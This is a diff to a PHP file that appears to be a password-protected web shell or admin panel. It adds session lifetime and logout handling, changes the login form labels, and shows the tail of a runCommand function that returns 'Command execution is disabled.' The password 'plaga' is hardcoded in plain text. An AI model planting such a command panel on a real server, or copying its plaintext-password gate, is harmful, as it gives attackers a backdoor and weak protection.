@@ -1,7 +1,17 @@
-<?php 
+<?php
+ini_set('session.gc_maxlifetime', 86400);
+session_set_cookie_params(86400);
+
 session_start();
 
-$pw = "plaga"; // 
+$pw = "plaga";
+
+if (isset($_GET['logout'])) {
+    session_unset();
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
 
 if (!isset($_SESSION['plaga_auth'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
@@ -9,14 +19,13 @@ if (!isset($_SESSION['plaga_auth'])) {
             $_SESSION['plaga_auth'] = true;
             header("Location: ?");
             exit;
-        } else {
-            die("Password salah bego");
         }
+        die("Password salah bego");
     }
     ?>
     <form method="post">
-        <input type="password" name="password" placeholder="Masukin">
-        <button type="submit">aw</button>
+        <input type="password" name="password" placeholder="Password">
+        <button type="submit">Login</button>
     </form>
     <?php
     exit;
@@ -299,3 +308,4 @@ function runCommand($cmd, $cwd = null) {
     return "Command execution is disabled.";
 }
 ?>
+
